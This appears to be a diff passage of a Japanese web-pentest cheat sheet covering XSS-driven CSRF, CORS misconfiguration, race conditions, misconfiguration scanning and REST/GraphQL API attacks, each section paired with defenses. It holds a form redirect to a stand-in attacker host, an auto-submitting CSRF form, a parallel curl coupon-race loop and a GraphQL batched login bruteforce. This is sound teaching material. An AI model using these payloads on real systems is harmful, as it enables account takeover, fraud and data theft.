+  f.action='https://attacker.example.com/'; f.method='get';
+});</code></pre></div>
+
+      <div class="note"><span class="lbl">XSS-driven CSRF (Session Riding)</span>
+        HttpOnly で <code>document.cookie</code> が読めなくても、XSS から同一オリジンへ <code>fetch()</code> すればブラウザが自動で cookie を付与する。つまり cookie を盗まずとも、被害者セッションで状態変更リクエスト (パスワード変更 / 権限付与 / アドレス変更) を送れる。<code>credentials:'same-origin'</code> (または <code>'include'</code> + <code>mode:'no-cors'</code>) を指定して認証済みリクエストを発行する。CSRF トークンがあっても、XSS 経由なら DOM からトークンを読んで同送できるため防げない。
+      </div>
+
+      <h3>CSRF (Cross-Site Request Forgery)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">html</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- トークン欠如時の自動送信フォーム --&gt;</span>
+&lt;form action="https://target.example.com/account/email" method="POST" id="c"&gt;
+  &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('c').submit()&lt;/script&gt;
+
+<span class="c">&lt;!-- SameSite バイパス検証: GET 化 / サブドメイン / method override --&gt;</span></code></pre></div>
+
+      <h3>Cross-Origin (SOP / SameSite / CORS)</h3>
+      <div class="note"><span class="lbl">3 つの境界の役割</span>
+        <ul>
+          <li><b>Same-Origin Policy (SOP)</b> — origin = scheme + host + port。JS が別 origin のレスポンスを<b>読む</b>ことを禁止 (リクエスト送信自体は許可)。画像 / iframe / script の埋込は SOP 例外</li>
+          <li><b>SameSite Cookie</b> — cookie を<b>送る</b>かを制御。<code>None</code>=常送 / <code>Lax</code>(既定)=トップレベル GET のみ / <code>Strict</code>=同一サイトのみ。CSRF の成否を左右する</li>
+          <li><b>CORS</b> — SOP を選択的に緩和。設定不備があれば攻撃者 origin にレスポンス読取を許してしまう</li>
+        </ul>
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code><span class="c"># CORS preflight (非単純リクエストで OPTIONS が先行)</span>
+OPTIONS /api/data HTTP/1.1
+Host: target.example.com
+Origin: https://attacker.example.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: X-Custom
+
+<span class="c"># 危険なレスポンス — Origin 反射 + credentials 許可</span>
+Access-Control-Allow-Origin: https://attacker.example.com
+Access-Control-Allow-Credentials: true</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Origin 反射 + credentials 許可の検証</span>
+curl -s -I https://target.example.com/api/data -H "Origin: https://attacker.example.com"
+<span class="c"># Access-Control-Allow-Origin が Origin をそのまま反射し</span>
+<span class="c"># Access-Control-Allow-Credentials: true なら情報奪取可能</span>
+
+<span class="c"># null origin / サブドメイン / 前方一致バイパスの検証</span>
+curl -s -I https://target.example.com/api/data -H "Origin: null"
+curl -s -I https://target.example.com/api/data -H "Origin: https://target.example.com.attacker.example.com"</code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        XSS は Repeater でコンテキスト (HTML body / 属性 / JS / URL) ごとに payload を試し、<b>DOM Invader</b> (Burp 内蔵ブラウザ) で DOM XSS の source→sink を自動追跡。反射 XSS は Intruder で XSS payload リストを流し、レスポンスに payload がエスケープされず出現するか判定。CORS は <b>passive scan</b> が Origin 反射を検出。CSRF PoC は Engagement tools → Generate CSRF PoC で自動生成できる。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>XSS: 出力コンテキストに応じたエスケープ、CSP (script-src 'self' 等) を strict に設定</li>
+          <li>XSS: Cookie に HttpOnly / Secure を付与、DOM sink (innerHTML / eval) を排除</li>
+          <li>CSRF: 予測不能な CSRF トークンを検証、SameSite=Lax/Strict を設定</li>
+          <li>CORS: Origin を allowlist で厳格検証、credentials 許可時にワイルドカード / 反射を禁止</li>
+          <li>clickjacking: X-Frame-Options: DENY または CSP frame-ancestors 'none'</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>XSS は出力コンテキスト (HTML / 属性 / JS / URL) を特定してから payload を選択</li>
+          <li>DOM XSS は source (location.hash 等) → sink (innerHTML 等) の追跡が肝、DOM Invader が有効</li>
+          <li>Blind XSS は管理画面等の遅延実行環境が標的、OOB コールバック (外部 JS 読込) で発火を検知</li>
+          <li>XSS の本質は被害者権限での行動: Saved Password 窃取 / Phishing / XSS-driven CSRF (HttpOnly でも fetch は cookie 自動付与)</li>
+          <li>SOP は「読取」を、SameSite は「cookie 送信」を制御する別々の境界。混同しない</li>
+          <li>CSRF はトークン欠如 + SameSite 設定不備が前提、状態変更リクエストが標的</li>
+          <li>CORS は「Origin 反射 + Allow-Credentials: true」の組み合わせが致命的</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s9" class="reveal">
+      <h2><span class="num">09</span>Race Conditions<span class="jp">競合状態</span></h2>
+      <p>複数リクエストが同一の共有状態 (DB レコード / 残高 / 適用フラグ) を同時に read-modify-write することで、検証と実行の間の隙 (TOCTOU) を突く。単発では正しく弾かれる操作を、並行実行で「制限を超過」させる。</p>
+
+      <h3>典型シナリオ (limit overrun)</h3>
+      <p>いずれも「検証 → 実行」の間に別リクエストが割り込む構造。1 回しか使えないクーポンの多重適用、残高チェックを回避した多重送金 / 出金、招待コードやギフトカードの多重利用、レート制限のすり抜けなど。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># curl の並行実行で同一リクエストを同時発火 (簡易検証)</span>
+for i in $(seq 1 30); do
+  curl -sk "https://target.example.com/api/coupon/apply" \
+    -H "Authorization: Bearer &lt;TOKEN&gt;" \
+    -d '{"code":"SAVE50"}' &amp;
+done; wait</code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        Race Condition は <b>Turbo Intruder</b> と Repeater の <b>parallel / single-packet attack</b> が決定版。同一の状態変更リクエストを Repeater の tab group にまとめ "Send group in parallel" で同時送信すると、ネットワークジッタを排した精密な同時到達が得られる。HTTP/2 対応サーバでは single-packet attack が最も信頼性が高い。Turbo Intruder は <code>race-single-packet-attack.py</code> テンプレートで大量同時リクエストをスクリプト制御できる。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>DB レベルの排他制御 (SELECT ... FOR UPDATE / 行ロック) と適切なトランザクション分離レベル</li>
+          <li>read-modify-write を単一のアトミック操作に (原子的デクリメント / 条件付き UPDATE)</li>
+          <li>べき等キー (idempotency key) で重複リクエストを排除</li>
+          <li>状態遷移をサーバ側で一意化、クライアント提供の状態を信頼しない</li>
+          <li>レート制限をアトミックなカウンタ (Redis INCR 等) で実装</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Race Condition は「検証と実行の間の隙 (TOCTOU)」を並行リクエストで突く</li>
+          <li>クーポン / 残高 / ギフトカード / レート制限など「1 回だけ」の制約が標的</li>
+          <li>Burp の single-packet attack (HTTP/2) が最も精密、Turbo Intruder でスクリプト制御</li>
+          <li>防御はアトミック操作 + 行ロック + べき等キーが基本</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Config &amp; Design<span class="jp">設定不備・設計欠陥</span></h2>
+      <p>個別の注入系脆弱性ではなく、設定・設計・依存関係のレベルで生じる問題。OWASP Top 10 の Security Misconfiguration / Insecure Design / Vulnerable Components に対応する。コマンドより「観点」と「チェックリスト」が中心。</p>
+
+      <h3>Security Misconfiguration</h3>
+      <p>本来は正しく設定できたはずの項目が放置された結果生じる。最新パッチ適用済みでも設定次第で露出する。</p>
+      <div class="note"><span class="lbl">典型的な確認項目</span>
+        <ul>
+          <li>クラウドストレージの公開設定 (パブリックな S3 バケット / Blob コンテナ)</li>
+          <li>デフォルト認証情報の未変更 (admin/admin、製品既定パスワード)</li>
+          <li>不要な機能・ページ・アカウント・権限の有効化</li>
+          <li>詳細なエラーメッセージ (スタックトレース / パス / バージョン露出)</li>
+          <li>セキュリティヘッダの欠如 (CSP / X-Frame-Options / HSTS / X-Content-Type-Options)</li>
+          <li>管理インターフェース / デバッグエンドポイントの公開</li>
+        </ul>
+      </div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># セキュリティヘッダの確認</span>
+curl -sI https://target.example.com | grep -iE 'content-security-policy|x-frame-options|strict-transport|x-content-type'
+
+<span class="c"># nuclei の misconfiguration テンプレート</span>
+nuclei -u https://target.example.com -t http/misconfiguration/
+
+<span class="c"># 公開 S3 バケットの確認</span>
+curl -s https://&lt;BUCKET&gt;.s3.amazonaws.com/
+aws s3 ls s3://&lt;BUCKET&gt;/ --no-sign-request</code></pre></div>
+
+      <h3>Insecure Design</h3>
+      <p>実装ミスや設定ミスではなく、アーキテクチャ / 設計そのものに内在する欠陥。脅威モデリング不足が原因で、コードが「仕様通り」でも脆弱になる。</p>
+      <div class="note"><span class="lbl">設計欠陥の例</span>
+        <ul>
+          <li>テスト用の抜け道が本番に残存 (OTP 検証の無効化、デバッグバイパス)</li>
+          <li>レート制限が IP 単位のみ — 複数 IP 分散でブルートフォース可能 (例: 6 桁コード = 100 万通り、250 回/IP 制限なら約 4,000 IP で全探索、クラウドで現実的)</li>
+          <li>ビジネスロジックの前提破綻 (「ユーザは分散攻撃しない」等の暗黙の仮定)</li>
+          <li>多段階フローの中間状態を検証しない (s09 Race Condition とも接続)</li>
+        </ul>
+      </div>
+
+      <h3>Vulnerable &amp; Outdated Components</h3>
+      <p>既知の脆弱性を持つライブラリ / フレームワーク / ソフトウェアの使用。既製の exploit が Exploit-DB 等に存在すれば、攻撃者の労力は最小で済む。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># バージョン指紋 → 既知 CVE 照合</span>
+whatweb -a 3 https://target.example.com
+nuclei -u https://target.example.com -t http/cves/ -t http/vulnerabilities/
+
+<span class="c"># CMS 別スキャナ</span>
+wpscan --url https://target.example.com --enumerate vp,vt,u
+droopescan scan drupal -u https://target.example.com
+
+<span class="c"># 既知 exploit 検索</span>
+searchsploit &lt;PRODUCT&gt; &lt;VERSION&gt;</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Misconfig: セキュアなベースライン設定を IaC で標準化、CIS Benchmark 準拠、不要機能を無効化</li>
+          <li>Misconfig: エラーは汎用メッセージに統一、セキュリティヘッダを全レスポンスで付与</li>
+          <li>Design: 開発初期の脅威モデリング、テスト用バイパスの本番混入を CI で検出</li>
+          <li>Design: レート制限をアカウント / 操作単位でも適用 (IP 単位だけに依存しない)</li>
+          <li>Components: SBOM 管理 + SCA ツール (Dependabot / Snyk) で既知 CVE を継続監視、定期更新</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Misconfiguration は「設定できたのに放置」が本質、S3 公開 / デフォルト認証情報 / ヘッダ欠如が定番</li>
+          <li>Insecure Design は実装でなく設計の欠陥、レート制限の IP 単位依存が典型的な破綻例</li>
+          <li>Vulnerable Components はバージョン指紋 → 既知 CVE 照合が起点、既製 exploit で低労力</li>
+          <li>これら 3 カテゴリは単発 payload でなく「観点」で検出する、nuclei のテンプレート群が有効</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s11" class="reveal">
+      <h2><span class="num">11</span>API<span class="jp">API</span></h2>
+      <p>REST / GraphQL API 固有の攻撃面。過剰なデータ露出、レート制限不備、GraphQL の introspection とバッチクエリ悪用が中心。</p>
+
+      <h3>REST API</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># メソッド総当たり (制限された操作の露出)</span>
+for m in GET POST PUT DELETE PATCH OPTIONS; do
+  echo "== $m =="
+  curl -sk -X $m "https://target.example.com/api/user/1" -H "Authorization: Bearer &lt;TOKEN&gt;" -o /dev/null -w "%{http_code}\n"
+done
+
+<span class="c"># バージョン差異の悪用 (旧 API の脆弱性残存)</span>
+<span class="c"># /api/v1/ /api/v2/ /api/internal/</span>
+
+<span class="c"># ドキュメント / スキーマ探索</span>
+curl -s https://target.example.com/swagger.json
+curl -s https://target.example.com/openapi.json
+curl -s https://target.example.com/api/docs</code></pre></div>
+
+      <h3>GraphQL</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># introspection でスキーマ全体を取得</span>
+curl -s https://target.example.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'
+
+<span class="c"># introspection query (完全版は clairvoyance / graphw00f で自動化)</span>
+<span class="c"># graphw00f -d -f -t https://target.example.com/graphql</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">graphql</span><button class="copy">copy</button></div><pre><code><span class="c"># バッチクエリでレート制限回避 (bruteforce 増幅)</span>
+{
+  a1: login(user:"admin", pass:"p1") { token }
+  a2: login(user:"admin", pass:"p2") { token }
+  a3: login(user:"admin", pass:"p3") { token }
+}
+
+<span class="c"># alias によるフィールド重複要求 / DoS</span>
+<span class="c"># ネスト深いクエリで resource exhaustion</span></code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        GraphQL は <b>InQL</b> 拡張で introspection を自動取得し、スキーマからクエリテンプレートを生成する。REST は Repeater でメソッド / バージョン / パラメータを差し替え、<b>Content Type Converter</b> 拡張で JSON↔XML↔form を変換して検証。API のドキュメント (swagger / openapi) を取得できたら、エンドポイント一覧を Intruder に流し込んで一括探索。認可テストは s3 と同様 Autorize で低権限アクセスを自動判定。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>本番で GraphQL introspection を無効化、スキーマ露出を防ぐ</li>
+          <li>クエリの深さ / 複雑度制限、バッチクエリ数の上限設定 (DoS / bruteforce 増幅対策)</li>
+          <li>レート制限を API ゲートウェイで一元適用、認証エンドポイントは特に厳格に</li>
+          <li>過剰なデータ露出を避け、レスポンスフィールドを必要最小限に (BOLA / excessive data exposure)</li>
+          <li>旧バージョン API を廃止、swagger / openapi ドキュメントを本番非公開に</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>REST はメソッド総当たり + バージョン差異 + スキーマ露出 (swagger) が探索の起点</li>
+          <li>GraphQL は introspection でスキーマ全取得 → InQL でクエリ生成が定石</li>
+          <li>GraphQL バッチクエリはレート制限を回避して bruteforce を増幅する</li>
+          <li>API の認可不備 (BOLA / IDOR) は s3 Access Control と同じ手法で Autorize 検証</li>
         </ul>
       </div>
     </section>
 
     <section id="ref" class="reveal">
-      <h2><span class="num">06</span>参照<span class="jp">References</span></h2>
+      <h2><span class="num">12</span>References<span class="jp">参照</span></h2>
       <ul>
+        <li>OWASP Web Security Testing Guide (WSTG) — <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">owasp.org/wstg</a></li>
         <li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">portswigger.net/web-security</a></li>
-        <li>OWASP Testing Guide — <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">owasp.org</a></li>
-        <li>PayloadsAllTheThings — <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+        <li>PayloadsAllTheThings (swisskyrepo) — <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+        <li>HackTricks (Web / Pentesting) — <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">book.hacktricks.xyz</a></li>
+        <li>OWASP Cheat Sheet Series — <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener">cheatsheetseries.owasp.org</a></li>
+        <li>ysoserial (Java) — <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">github.com/frohoff/ysoserial</a></li>
+        <li>phpggc (PHP) — <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">github.com/ambionics/phpggc</a></li>
+        <li>ysoserial.net (.NET) — <a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">github.com/pwntester/ysoserial.net</a></li>
+        <li>jwt_tool — <a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">github.com/ticarpi/jwt_tool</a></li>
+        <li>OWASP API Security Top 10 — <a href="https://owasp.org/API-Security/" target="_blank" rel="noopener">owasp.org/API-Security</a></li>
       </ul>
     </section>
+
   </article>
-</div></div>
+</div>
+</div>
 </main>
 
-<footer class="foot"><div class="wrap">
-  <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Web</span></div>
-  <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>github</a></div>
-  <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
-</div></footer>
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Web Application Attacks</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
 
 <script src="../content.js"></script>
 <script src="../assets/js/sheet.js"></script>
